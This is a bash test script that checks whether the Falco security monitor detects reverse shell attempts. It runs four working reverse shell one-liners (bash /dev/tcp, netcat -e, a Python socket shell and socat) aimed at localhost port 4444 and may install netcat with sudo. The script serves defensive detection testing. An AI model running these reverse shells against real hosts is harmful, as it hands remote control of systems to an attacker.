#!/usr/bin/env bash
# Test Case 7: Reverse Shell Detection
# Test Objective: Verify Falco can detect reverse shell connections

set -e

echo "=========================================="
echo "Test Case 7: Reverse Shell Detection"
echo "=========================================="
echo ""
echo "Test Objective: Verify Falco can detect reverse shell connection attempts"
echo ""

# Check if Falco is running
if ! pgrep -x falco > /dev/null; then
    echo "Warning: Falco process is not running, please start Falco first"
    echo "Start command: sudo falco -c /etc/falco/falco.yaml & (in another terminal)"
    echo ""
    read -p "Continue test? (y/n) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

echo "Executing test operation: Attempting reverse shell connection (simulated)"
echo "Expected: Falco may detect suspicious network connections and shell execution"
echo ""

# Simulate reverse shell attempt using bash with /dev/tcp
echo ">>> Executing: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 (will fail, but triggers detection)"
timeout 1 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>&1 || true

echo ""
echo ">>> Executing: nc -e /bin/bash 127.0.0.1 4444 (if netcat is available)"
if command -v nc &> /dev/null; then
    timeout 1 nc -e /bin/bash 127.0.0.1 4444 2>&1 || true
else
    echo "  netcat not available, installing..."
    sudo apt-get update && sudo apt-get install -y netcat 2>/dev/null || true
    timeout 1 nc -e /bin/bash 127.0.0.1 4444 2>&1 || true
fi

echo ""
echo ">>> Executing: python3 reverse shell (Python reverse shell)"
timeout 1 python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
" 2>&1 || true

# Also try using socat if available
echo ""
echo ">>> Executing: socat reverse shell (if available)"
if command -v socat &> /dev/null; then
    timeout 1 socat TCP:127.0.0.1:4444 EXEC:/bin/bash 2>&1 || true
else
    echo "  socat not available, skipping"
fi

echo ""
echo ">>> Test operation completed"
echo ""
echo "Please check Falco log output for reverse shell related warnings:"
echo "  - Process: process=bash, nc, python, socat"
echo "  - Network connections to suspicious ports (4444)"
echo "  - Shell execution with network redirection"
echo "  - Suspicious network connection patterns"
echo ""
echo "Note: Network-related rules are more likely to be enabled by default"
echo "If Falco is running in background, view logs: tail -f /var/log/falco.log"
echo ""
